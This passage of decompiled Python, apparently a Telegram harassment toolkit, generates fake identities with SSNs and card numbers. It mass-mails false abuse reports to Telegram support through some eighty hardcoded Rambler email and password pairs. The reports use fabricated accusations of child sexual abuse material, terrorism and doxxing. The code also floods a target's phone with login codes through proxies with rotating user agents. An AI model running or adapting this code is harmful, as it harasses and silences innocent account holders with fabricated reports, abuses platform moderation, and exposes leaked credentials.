        with open('Incognits.txt', 'w', encoding='utf-8') as file: # DECODED BY https://github.com/MrN3lson-Script
            for _ in range(num_persons): # DECODED BY https://github.com/MrN3lson-Script
                person = { # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.name(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.address(), # DECODED BY https://github.com/MrN3lson-Script
                    "Email": fake.email(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.phone_number(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.job(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.company(), # DECODED BY https://github.com/MrN3lson-Script
                    " ": fake.date_of_birth(minimum_age=18, maximum_age=90).strftime('%Y-%m-%d'), # DECODED BY https://github.com/MrN3lson-Script
                    " ": fake.ssn(), # DECODED BY https://github.com/MrN3lson-Script
                    " ": fake.user_name(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.password(), # DECODED BY https://github.com/MrN3lson-Script
                    " ": fake.credit_card_full(), # DECODED BY https://github.com/MrN3lson-Script
                    "IP ": fake.ipv4(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.country(), # DECODED BY https://github.com/MrN3lson-Script
                    "": fake.city(), # DECODED BY https://github.com/MrN3lson-Script
                } # DECODED BY https://github.com/MrN3lson-Script
                generated_data.append(person) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                for key, value in person.items(): # DECODED BY https://github.com/MrN3lson-Script
                    file.write(f"{key}: {value}\
") # DECODED BY https://github.com/MrN3lson-Script
                file.write("\
") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        if num_persons <= 100: # DECODED BY https://github.com/MrN3lson-Script
            for person in generated_data: # DECODED BY https://github.com/MrN3lson-Script
                for key, value in person.items(): # DECODED BY https://github.com/MrN3lson-Script
                    print(f"{key}: {value}") # DECODED BY https://github.com/MrN3lson-Script
                print() # DECODED BY https://github.com/MrN3lson-Script
            print("    'Incognits.txt'.\
") # DECODED BY https://github.com/MrN3lson-Script
        else: # DECODED BY https://github.com/MrN3lson-Script
            print(f" {num_persons} .     'Incognits.txt'.") # DECODED BY https://github.com/MrN3lson-Script
  # DECODED BY https://github.com/MrN3lson-Script
def text_swat(): # DECODED BY https://github.com/MrN3lson-Script
    def replace_chars(text, use_fence): # DECODED BY https://github.com/MrN3lson-Script
        replacements = { # DECODED BY https://github.com/MrN3lson-Script
            '': '', '': '', '': '', '': '', '': 'B', '': '', '': '', '': '',  # DECODED BY https://github.com/MrN3lson-Script
            '': 'D', '': 'd', '': 'E', '': 'e', '': '', '': '', '': '', '': '',  # DECODED BY https://github.com/MrN3lson-Script
            '': '3', '': '3', '': 'U', '': 'u', '': '', '': 'K', '': 'k', '': 'JI', "": "JI", # DECODED BY https://github.com/MrN3lson-Script
            '': 'M', '': '', '': '', '': '', '': '0', '': 'n', '': 'p', '': 'c', "": "S", # DECODED BY https://github.com/MrN3lson-Script
            '': 'T', '': 'y', '': '', '': 'x', '': '4', "": "4",'': 'III', "": "III", '': '', '': '',  # DECODED BY https://github.com/MrN3lson-Script
            '': 'bI', "": "bI", '': '', '': '' # DECODED BY https://github.com/MrN3lson-Script
        } # DECODED BY https://github.com/MrN3lson-Script
        result = '' # DECODED BY https://github.com/MrN3lson-Script
        for char in text: # DECODED BY https://github.com/MrN3lson-Script
            if use_fence: # DECODED BY https://github.com/MrN3lson-Script
                result += replacements.get(char.upper(), char) # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                result += replacements.get(char.upper(), char.upper()) # DECODED BY https://github.com/MrN3lson-Script
        return result # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    while True: # DECODED BY https://github.com/MrN3lson-Script
        print("\
[0] - ") # DECODED BY https://github.com/MrN3lson-Script
        print("[1] -   .\
[2] -  .\
") # DECODED BY https://github.com/MrN3lson-Script
        option = input(" : ") # DECODED BY https://github.com/MrN3lson-Script
        if option == '0': # DECODED BY https://github.com/MrN3lson-Script
        	break # DECODED BY https://github.com/MrN3lson-Script
        if option not in ['1', '2', '0']: # DECODED BY https://github.com/MrN3lson-Script
            print(":  .") # DECODED BY https://github.com/MrN3lson-Script
        user_input = input(" : ") # DECODED BY https://github.com/MrN3lson-Script
        replaced_text = replace_chars(user_input, option == '1') # DECODED BY https://github.com/MrN3lson-Script
        print(" :\
") # DECODED BY https://github.com/MrN3lson-Script
        print(replaced_text) # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
def snos_email(): # DECODED BY https://github.com/MrN3lson-Script
    def install_and_import(package): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            __import__(package) # DECODED BY https://github.com/MrN3lson-Script
        except ImportError: # DECODED BY https://github.com/MrN3lson-Script
            print(f" {package}...") # DECODED BY https://github.com/MrN3lson-Script
            subprocess.check_call([sys.executable, "-m", "pip", "install", package]) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    install_and_import('random') # DECODED BY https://github.com/MrN3lson-Script
    install_and_import('string') # DECODED BY https://github.com/MrN3lson-Script
    install_and_import('smtplib') # DECODED BY https://github.com/MrN3lson-Script
    install_and_import('email') # DECODED BY https://github.com/MrN3lson-Script
    install_and_import('time') # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    senders = { # DECODED BY https://github.com/MrN3lson-Script
        'lyimbshsup@rambler.ru': '6463734rnAygg', # DECODED BY https://github.com/MrN3lson-Script
        'jdqukazixk@rambler.ru': '0225223ACFeq0', # DECODED BY https://github.com/MrN3lson-Script
        'baljufgcnc@rambler.ru': '4738678YMyCvO', # DECODED BY https://github.com/MrN3lson-Script
        'ruslanorlovimx4134@rambler.ru': 'Andersonnancy945', # DECODED BY https://github.com/MrN3lson-Script
        'vladislavkulikovxcr1902@rambler.ru': 'Allenkimberly021', # DECODED BY https://github.com/MrN3lson-Script
        'romasidorovdbj3700@rambler.ru': 'Clarkmargaret444', # DECODED BY https://github.com/MrN3lson-Script
        'lehabogdanovhdw1954@rambler.ru': 'Evanssandra913', # DECODED BY https://github.com/MrN3lson-Script
        'mihailtitovopr6182@rambler.ru': 'Younghelen407', # DECODED BY https://github.com/MrN3lson-Script
        'koljafedotovmqj2347@rambler.ru': 'Gonzalezsarah321', # DECODED BY https://github.com/MrN3lson-Script
        'genasemenovhvu9785@rambler.ru': 'Taylorlaura482', # DECODED BY https://github.com/MrN3lson-Script
        'vovafedorovmvu7067@rambler.ru': 'Collinsbetty976', # DECODED BY https://github.com/MrN3lson-Script
        'grishakulikovyyk8848@rambler.ru': 'Wilsonlaura931', # DECODED BY https://github.com/MrN3lson-Script
        'olegnikitinxwo3553@rambler.ru': 'Wrightkaren568', # DECODED BY https://github.com/MrN3lson-Script
        'gennadijkalininizb3132@rambler.ru': 'Turnerdorothy038', # DECODED BY https://github.com/MrN3lson-Script
        'bogdankarpovxad9304@rambler.ru': 'Carterlinda019', # DECODED BY https://github.com/MrN3lson-Script
        'koljakuznecovzfq8892@rambler.ru': 'Walkerhelen225', # DECODED BY https://github.com/MrN3lson-Script
        'vladdmitrievtpv8734@rambler.ru': 'Brownmary434', # DECODED BY https://github.com/MrN3lson-Script
        'arturkovalevdln7432@rambler.ru': 'Lewisnancy365', # DECODED BY https://github.com/MrN3lson-Script
        'konstantinbelovabq7348@rambler.ru': 'Allenmary923', # DECODED BY https://github.com/MrN3lson-Script
        'sashavorobevbml8362@rambler.ru': 'Hilllaura818', # DECODED BY https://github.com/MrN3lson-Script
        'ruslankozlovhji7240@rambler.ru': 'Hallnancy735', # DECODED BY https://github.com/MrN3lson-Script
        'olegzajcevepy8163@rambler.ru': 'Nelsonsharon117', # DECODED BY https://github.com/MrN3lson-Script
        'grigorijfominlxp0053@rambler.ru': 'Wrightpatricia686', # DECODED BY https://github.com/MrN3lson-Script
        'vitalijmaslovusv3737@rambler.ru': 'Garciabetty827', # DECODED BY https://github.com/MrN3lson-Script
        'olegbelovblx5518@rambler.ru': 'Phillipssharon437', # DECODED BY https://github.com/MrN3lson-Script
        'olegmaslovrde8926@rambler.ru': 'Mitchellbetty324', # DECODED BY https://github.com/MrN3lson-Script
        'vitalijdavydovtal6583@rambler.ru': 'Rodriguezmichelle351', # DECODED BY https://github.com/MrN3lson-Script
        'dmitrijmironovlaf9788@rambler.ru': 'Whitedeborah816', # DECODED BY https://github.com/MrN3lson-Script
        'vanjakulikovdpf6394@rambler.ru': 'Allencarol017', # DECODED BY https://github.com/MrN3lson-Script
        'andrejmaksimovwjw5202@rambler.ru': 'Cartersusan436', # DECODED BY https://github.com/MrN3lson-Script
        'zhenjaafanasevomj8876@rambler.ru': 'Harrislinda730', # DECODED BY https://github.com/MrN3lson-Script
        'sanjatimofeevxur1820@rambler.ru': 'Martinmichelle433', # DECODED BY https://github.com/MrN3lson-Script
        'grishabogdanovhqj9645@rambler.ru': 'Turnermargaret062', # DECODED BY https://github.com/MrN3lson-Script
        'viktorpavlovzlh2404@rambler.ru': 'Hilllaura917', # DECODED BY https://github.com/MrN3lson-Script
        'mihailkuznecovbuh2424@rambler.ru': 'Millerkaren783', # DECODED BY https://github.com/MrN3lson-Script
        'bogdanmironovkgf3690@rambler.ru': 'Greenjennifer095', # DECODED BY https://github.com/MrN3lson-Script
        'tolikkulikovnfv3662@rambler.ru': 'Perezelizabeth881', # DECODED BY https://github.com/MrN3lson-Script
        'sanjaabramovotb8410@rambler.ru': 'Hillpatricia526', # DECODED BY https://github.com/MrN3lson-Script
        'pashabykovzhy8581@rambler.ru': 'Scottdonna750', # DECODED BY https://github.com/MrN3lson-Script
        'jurijbogdanovwuc0744@rambler.ru': 'Harrisnancy027', # DECODED BY https://github.com/MrN3lson-Script
        'antongusevaws0670@rambler.ru': 'Collinsruth779', # DECODED BY https://github.com/MrN3lson-Script
        'maksimlebedevsxm5444@rambler.ru': 'Evanskaren499', # DECODED BY https://github.com/MrN3lson-Script
        'vladimirchernyshevfnt3789@rambler.ru': 'Halldonna541', # DECODED BY https://github.com/MrN3lson-Script
        'petjagusevrzl9637@rambler.ru': 'Taylorpatricia485', # DECODED BY https://github.com/MrN3lson-Script
        'vitaliklebedevhla3289@rambler.ru': 'Lewismichelle721', # DECODED BY https://github.com/MrN3lson-Script
        'aleksandrwerbakovsbg8385@rambler.ru': 'Gonzalezdeborah554', # DECODED BY https://github.com/MrN3lson-Script
        'pavelgrigorevjtz4407@rambler.ru': 'Campbellbetty034', # DECODED BY https://github.com/MrN3lson-Script
        'maksdenisovskv0461@rambler.ru': 'Smithmaria151', # DECODED BY https://github.com/MrN3lson-Script
        'gennadijtihonovqzc3691@rambler.ru': 'Clarksharon602', # DECODED BY https://github.com/MrN3lson-Script
        'ruslandmitrievvgr1236@rambler.ru': 'Kingdeborah697', # DECODED BY https://github.com/MrN3lson-Script
        'genamaslovfys4433@rambler.ru': 'Wrightsharon746', # DECODED BY https://github.com/MrN3lson-Script
        'borjamironovfrc3345@rambler.ru': 'Harrissusan337', # DECODED BY https://github.com/MrN3lson-Script
        'antonchernovown4062@rambler.ru': 'Thomaskimberly712', # DECODED BY https://github.com/MrN3lson-Script
        'vladimirgrigoreveqq9112@rambler.ru': 'Parkermichelle304', # DECODED BY https://github.com/MrN3lson-Script
        'sashawerbakoviet2953@rambler.ru': 'Clarksharon806', # DECODED BY https://github.com/MrN3lson-Script
        'mishaantonovcwv6881@rambler.ru': 'Kingmargaret388', # DECODED BY https://github.com/MrN3lson-Script
        'mihailmelnikovoyp1458@rambler.ru': 'Wilsonlisa429', # DECODED BY https://github.com/MrN3lson-Script
        'kostjakiselevhjw4194@rambler.ru': 'Evanshelen904', # DECODED BY https://github.com/MrN3lson-Script
        'kostjastepanovbes5317@rambler.ru': 'Carterlaura187', # DECODED BY https://github.com/MrN3lson-Script
        'toljadanilovcvh2967@rambler.ru': 'Martinezbarbara968', # DECODED BY https://github.com/MrN3lson-Script
        'leshakozlovspt3407@rambler.ru': 'Hernandezbetty901', # DECODED BY https://github.com/MrN3lson-Script
        'vanjakozlovbvy7090@rambler.ru': 'Jonescarol966', # DECODED BY https://github.com/MrN3lson-Script
        'leshafilippovfha9160@rambler.ru': 'Davislinda702', # DECODED BY https://github.com/MrN3lson-Script
        'olegjakovlevmkp6120@rambler.ru': 'Perezjennifer226', # DECODED BY https://github.com/MrN3lson-Script
        'igorisaevfen3865@rambler.ru': 'Allenpatricia615', # DECODED BY https://github.com/MrN3lson-Script
        'pashakonovalovgmf3693@rambler.ru': 'Garciamichelle737', # DECODED BY https://github.com/MrN3lson-Script
        'vladimirandreevqol3763@rambler.ru': 'Robinsonkimberly357', # DECODED BY https://github.com/MrN3lson-Script
        'jurijprohorovgnq3561@rambler.ru': 'Kinglaura374', # DECODED BY https://github.com/MrN3lson-Script
        'vladislavtarasovpqk4498@rambler.ru': 'Garciacarol344', # DECODED BY https://github.com/MrN3lson-Script
        'antonvorobevtxz5033@rambler.ru': 'Lopezlinda159', # DECODED BY https://github.com/MrN3lson-Script
        'romaandreevjvo1698@rambler.ru': 'Youngnancy376', # DECODED BY https://github.com/MrN3lson-Script
        'vladislavbeljaevvfa7045@rambler.ru': 'Robertsjennifer080', # DECODED BY https://github.com/MrN3lson-Script
        'vitaliknikolaevzoh1565@rambler.ru': 'Collinsdonna967', # DECODED BY https://github.com/MrN3lson-Script
        'koljamironovydt4703@rambler.ru': 'Wrightmichelle859', # DECODED BY https://github.com/MrN3lson-Script
        'gennadijsemenovmki9018@rambler.ru': 'Perezsusan734', # DECODED BY https://github.com/MrN3lson-Script
        'pashakarpovafr2420@rambler.ru': 'Wrightsarah462', # DECODED BY https://github.com/MrN3lson-Script
        'artemkomarovqqt3719@rambler.ru': 'Martinlinda992', # DECODED BY https://github.com/MrN3lson-Script
        'konstantinchernyshevneh8321@rambler.ru': 'Smithdonna021', # DECODED BY https://github.com/MrN3lson-Script
        'grigorijsidorovrpl5056@rambler.ru': 'Harrispatricia221', # DECODED BY https://github.com/MrN3lson-Script
        'petrsergeevmse2216@rambler.ru': 'Bakerjennifer796' # DECODED BY https://github.com/MrN3lson-Script
    } # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org', 'support@telegram.org'] # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def print_menu(): # DECODED BY https://github.com/MrN3lson-Script
        print("\033[92m:\033[0m") # DECODED BY https://github.com/MrN3lson-Script
        print("[ 1 ] Snos ") # DECODED BY https://github.com/MrN3lson-Script
        print("[ 2 ] Snos ") # DECODED BY https://github.com/MrN3lson-Script
        print("[ 0 ] \
") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def send_email(receiver, sender_email, sender_password, subject, body): # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            msg = MIMEMultipart() # DECODED BY https://github.com/MrN3lson-Script
            msg['From'] = sender_email # DECODED BY https://github.com/MrN3lson-Script
            msg['To'] = receiver # DECODED BY https://github.com/MrN3lson-Script
            msg['Subject'] = subject # DECODED BY https://github.com/MrN3lson-Script
            msg.attach(MIMEText(body, 'plain')) # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            server = smtplib.SMTP('smtp.rambler.ru', 587) # DECODED BY https://github.com/MrN3lson-Script
            server.starttls() # DECODED BY https://github.com/MrN3lson-Script
            server.login(sender_email, sender_password) # DECODED BY https://github.com/MrN3lson-Script
            server.sendmail(sender_email, receiver, msg.as_string()) # DECODED BY https://github.com/MrN3lson-Script
            time.sleep(3) # DECODED BY https://github.com/MrN3lson-Script
            server.quit() # DECODED BY https://github.com/MrN3lson-Script
            return True # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"   : {e}") # DECODED BY https://github.com/MrN3lson-Script
            return False # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def handle_complaint(): # DECODED BY https://github.com/MrN3lson-Script
        total_emails = len(senders) * len(receivers) # DECODED BY https://github.com/MrN3lson-Script
        sent_emails = 0 # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
        while sent_emails < total_emails: # DECODED BY https://github.com/MrN3lson-Script
            print_menu() # DECODED BY https://github.com/MrN3lson-Script
            choice = input("\
: ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            if choice == "1": # DECODED BY https://github.com/MrN3lson-Script
                print("\
  :") # DECODED BY https://github.com/MrN3lson-Script
                print("\
[ 1.1 ]  snos") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 1.2 ] Snos ") # DECODED BY https://github.com/MrN3lson-Script
                complaint_choice = input(" : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                if complaint_choice == "1.1": # DECODED BY https://github.com/MrN3lson-Script
                    print("\
 , , telegram ID,    /   ") # DECODED BY https://github.com/MrN3lson-Script
                    reason = input("\
: ") # DECODED BY https://github.com/MrN3lson-Script
                    username = input(": ") # DECODED BY https://github.com/MrN3lson-Script
                    telegram_ID = input("Telegram ID: ") # DECODED BY https://github.com/MrN3lson-Script
                    chat_link = input("\
\
  : ") # DECODED BY https://github.com/MrN3lson-Script
                    violation_chat_link = input("\
  : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                    complaint_texts = { # DECODED BY https://github.com/MrN3lson-Script
                        "1.1": f",  ,       ,    ,   {reason}.   - {username},     ID - {telegram_ID}.      - {chat_link},    - {violation_chat_link}.   ." # DECODED BY https://github.com/MrN3lson-Script
                    } # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                    for sender_email, sender_password in senders.items(): # DECODED BY https://github.com/MrN3lson-Script
                        for receiver_email in receivers: # DECODED BY https://github.com/MrN3lson-Script
                            complaint_text = complaint_texts[complaint_choice] # DECODED BY https://github.com/MrN3lson-Script
                            complaint_body = complaint_text.format(reason=reason.strip(), username=username.strip(), telegram_ID=telegram_ID.strip(), chat_link=chat_link.strip(), violation_chat_link=violation_chat_link.strip()) # DECODED BY https://github.com/MrN3lson-Script
                            if send_email(receiver_email, sender_email, sender_password, "  Telegram ", complaint_body): # DECODED BY https://github.com/MrN3lson-Script
                                print(f"\
\
[  ]  ! | {receiver_email}  {sender_email}!") # DECODED BY https://github.com/MrN3lson-Script
                                sent_emails += 1 # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                elif complaint_choice == "1.2": # DECODED BY https://github.com/MrN3lson-Script
                    print("\
   Telegram ID") # DECODED BY https://github.com/MrN3lson-Script
                    account_username = input("\
Username: ") # DECODED BY https://github.com/MrN3lson-Script
                    Telegram_account_ID = input("Telegram ID: ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                    complaint_texts = { # DECODED BY https://github.com/MrN3lson-Script
                        "1.2": f",    -  .     ,       - .    ,             .    {account_username},   ,      {Telegram_account_ID}. ,      ,         ." # DECODED BY https://github.com/MrN3lson-Script
                    } # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                    for sender_email, sender_password in senders.items(): # DECODED BY https://github.com/MrN3lson-Script
                        for receiver_email in receivers: # DECODED BY https://github.com/MrN3lson-Script
                            complaint_text = complaint_texts[complaint_choice] # DECODED BY https://github.com/MrN3lson-Script
                            complaint_body = complaint_text.format(account_username=account_username.strip(), Telegram_account_ID=Telegram_account_ID.strip()) # DECODED BY https://github.com/MrN3lson-Script
                            if send_email(receiver_email, sender_email, sender_password, "   -", complaint_body): # DECODED BY https://github.com/MrN3lson-Script
                                print(f"\
\
[  ]  ! |{receiver_email}  {sender_email}!") # DECODED BY https://github.com/MrN3lson-Script
                                sent_emails += 1 # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "2": # DECODED BY https://github.com/MrN3lson-Script
                print("\
  :") # DECODED BY https://github.com/MrN3lson-Script
                print("\
\
[ 8 ]  ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 9 ]  ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 10 ]  ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 11 ]  ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 12 ] ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 13 ]   ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 14 ] ") # DECODED BY https://github.com/MrN3lson-Script
                print("[ 15 ] ") # DECODED BY https://github.com/MrN3lson-Script
                complaint_type = input("\
: ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                complaint_types = { # DECODED BY https://github.com/MrN3lson-Script
                    "8": [",  !       ,       .    - {channel_link} .    - {violation_link} .       ", "Hello, Telegram support team! I have found a channel on your social network where personal data of innocent people is being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform"], # DECODED BY https://github.com/MrN3lson-Script
                    "9": [",  ,    ,   , .    :{channel_link}   :{violation_link}    .", "Hello, dear Telegram moderator,I would like to file a complaint regarding a channel on your platform that is selling doxxing and swatting services. Here are the details: Telegram channel link: {channel_link} Violation link: {violation_link} Please block this channel."], # DECODED BY https://github.com/MrN3lson-Script
                    "10": ["Hello dear Telegram support! Please block the {channel_link} channel The channel threatens to shoot children in schools and commit terrorist attacks, you can see it here {violation_link} Thank you in advance", ",   Telegram! ,   {channel_link}.            ,      {violation_link}.  ."], # DECODED BY https://github.com/MrN3lson-Script
                    "11": [",  !       ,       .    - {channel_link}  .    - {violation_link} .       ", "Hello, Telegram support! In your social network, I found a channel posting pornography videos with children. Channel link - {channel_link} violation link - {violation_link} , please block this channel"], # DECODED BY https://github.com/MrN3lson-Script
                    "12": [",  !       ,         .    - {channel_link}  .    - {violation_link} .       ", "Hello, Telegram support! In your social network, I found a channel where posts aimed at deception and fraud are being published. The link to the channel is {channel_link}. The link to the violation is {violation_link}. Please remove this channel from your platform."], # DECODED BY https://github.com/MrN3lson-Script
                    "13": [",  telegram.          ,        .    - {channel_link}    - {violation_link} .        !", "Hello, Telegram support. I would like to report a Telegram channel selling virtual phone numbers, which as far as I know, is prohibited by your platform's rules. Here are the details:Channel link: {channel_link} Violation link: {violation_link} Thank you for cleansing your platform from such channels!"], # DECODED BY https://github.com/MrN3lson-Script
                    "14": ["  ,  .       ,      .    - {channel_link} ,    - {violation_link} .    ,   .", "Good day, esteemed support team. I came across a channel on your platform that disseminates shocking content involving human fatalities. Here is the link to the channel - {channel_link}, along withthe violation link - {violation_link}. Kindly remove this channel. Thank you for your attention."], # DECODED BY https://github.com/MrN3lson-Script
                    "15": [",  .            .    - {channel_link}    - {violation_link}.       .", "Hello, dear support. I found a channel postingcruelty to animals. Channel link - {channel_link} , violation links - {violation_link} Thank you"], # DECODED BY https://github.com/MrN3lson-Script
                } # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                if complaint_type not in complaint_types: # DECODED BY https://github.com/MrN3lson-Script
                    print("\
\
[ Error ]  .") # DECODED BY https://github.com/MrN3lson-Script
                else: # DECODED BY https://github.com/MrN3lson-Script
                    complaint_texts = complaint_types[complaint_type] # DECODED BY https://github.com/MrN3lson-Script
                    channel_link = input("\
  : ") # DECODED BY https://github.com/MrN3lson-Script
                    violation_link = input("  : ") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                    for sender_email, sender_password in senders.items(): # DECODED BY https://github.com/MrN3lson-Script
                        for receiver_email in random.sample(receivers, min(2, len(receivers))): # DECODED BY https://github.com/MrN3lson-Script
                            complaint_body = complaint_texts[0].format(channel_link=channel_link.strip(), violation_link=violation_link.strip()) # DECODED BY https://github.com/MrN3lson-Script
                            if send_email(receiver_email, sender_email, sender_password, "    Telegram", complaint_body): # DECODED BY https://github.com/MrN3lson-Script
                                print(f"\
\
[  ]  ! |{receiver_email}!") # DECODED BY https://github.com/MrN3lson-Script
                                sent_emails += 1 # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
                    if len(complaint_texts) > 1: # DECODED BY https://github.com/MrN3lson-Script
                        for sender_email, sender_password in senders.items(): # DECODED BY https://github.com/MrN3lson-Script
                            for receiver_email in random.sample(receivers, min(2, len(receivers))): # DECODED BY https://github.com/MrN3lson-Script
                                complaint_body = complaint_texts[1].format(channel_link=channel_link.strip(), violation_link=violation_link.strip()) # DECODED BY https://github.com/MrN3lson-Script
                                if send_email(receiver_email, sender_email, sender_password, "Complaint about a channel in Telegram", complaint_body): # DECODED BY https://github.com/MrN3lson-Script
                                    print(f"Sent to {receiver_email}!") # DECODED BY https://github.com/MrN3lson-Script
                                    sent_emails += 1 # DECODED BY https://github.com/MrN3lson-Script
                    print("[  ]  ! |") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            elif choice == "0": # DECODED BY https://github.com/MrN3lson-Script
                print("  .") # DECODED BY https://github.com/MrN3lson-Script
                break # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
            else: # DECODED BY https://github.com/MrN3lson-Script
                print("\
\
[ Error ]  .") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    handle_complaint() # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
def snos_accounts(api_id, api_hash): # DECODED BY https://github.com/MrN3lson-Script
    def user_agents(): # DECODED BY https://github.com/MrN3lson-Script
        ua = UserAgent() # DECODED BY https://github.com/MrN3lson-Script
        return ua.random # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    async def auth_spam(phone): # DECODED BY https://github.com/MrN3lson-Script
        print("\
\
===  Authcode SPAM ===\
") # DECODED BY https://github.com/MrN3lson-Script
        for i in range(1, 7): # DECODED BY https://github.com/MrN3lson-Script
            try: # DECODED BY https://github.com/MrN3lson-Script
                random_text = ''.join(random.choice(string.ascii_letters) for _ in range(6)) # DECODED BY https://github.com/MrN3lson-Script
                client = TelegramClient(random_text, api_id, api_hash) # DECODED BY https://github.com/MrN3lson-Script
                await client.connect() # DECODED BY https://github.com/MrN3lson-Script
                await client.send_code_request(phone) # DECODED BY https://github.com/MrN3lson-Script
                await client.disconnect() # DECODED BY https://github.com/MrN3lson-Script
                print(f"[+]  {i}/6  ") # DECODED BY https://github.com/MrN3lson-Script
            except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
                print(f"[-]  {i}/6   : {e}") # DECODED BY https://github.com/MrN3lson-Script
         # DECODED BY https://github.com/MrN3lson-Script
        try: # DECODED BY https://github.com/MrN3lson-Script
            os.system("rm *.session") # DECODED BY https://github.com/MrN3lson-Script
            print("[+]  \
") # DECODED BY https://github.com/MrN3lson-Script
        except Exception as e: # DECODED BY https://github.com/MrN3lson-Script
            print(f"[-]    : {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    def site_auth_spam(phone): # DECODED BY https://github.com/MrN3lson-Script
        print("") # DECODED BY https://github.com/MrN3lson-Script
        data = {'phone': phone} # DECODED BY https://github.com/MrN3lson-Script
        urls = ['https://my.telegram.org/auth/send_password'] * 15 # DECODED BY https://github.com/MrN3lson-Script
        for i, url in enumerate(urls, 1): # DECODED BY https://github.com/MrN3lson-Script
            headers = {'User-Agent': user_agents()} # DECODED BY https://github.com/MrN3lson-Script
            try: # DECODED BY https://github.com/MrN3lson-Script
                response = requests.post(url, data=data, headers=headers, proxies=proxies()) # DECODED BY https://github.com/MrN3lson-Script
                status = "[+]" if response.ok else "[-]" # DECODED BY https://github.com/MrN3lson-Script
                print(f"{status}  {i}/15") # DECODED BY https://github.com/MrN3lson-Script
            except requests.RequestException as e: # DECODED BY https://github.com/MrN3lson-Script
                print(f"[-]  {i}/15 : {e}") # DECODED BY https://github.com/MrN3lson-Script
 # DECODED BY https://github.com/MrN3lson-Script
    proxies_list = [ # DECODED BY https://github.com/MrN3lson-Script
        '8.218.149.193:80', # DECODED BY https://github.com/MrN3lson-Script
        '47.57.233.126:80', # DECODED BY https://github.com/MrN3lson-Script
        '47.243.70.197:80', # DECODED BY https://github.com/MrN3lson-Script
        '8.222.193.208:80', # DECODED BY https://github.com/MrN3lson-Script
        '144.24.85.158:80', # DECODED BY https://github.com/MrN3lson-Script
        '47.245.115.6:80', # DECODED BY https://github.com/MrN3lson-Script
        '47.245.114.163:80', # DECODED BY https://github.com/MrN3lson-Script
        '45.4.55.10:40486',  # DECODED BY https://github.com/MrN3lson-Script
        '103.52.37.1:4145', # DECODED BY https://github.com/MrN3lson-Script
        '200.34.227.204:4153',  # DECODED BY https://github.com/MrN3lson-Script
        '190.109.74.1:33633', # DECODED BY https://github.com/MrN3lson-Script
        '200.54.221.202:4145',  # DECODED BY https://github.com/MrN3lson-Script
        '36.67.66.202:5678', # DECODED BY https://github.com/MrN3lson-Script
        '168.121.139.199:4145', # DECODED BY https://github.com/MrN3lson-Script
        '101.255.117.2:51122', # DECODED BY https://github.com/MrN3lson-Script
        '45.70.0.250:4145', # DECODED BY https://github.com/MrN3lson-Script
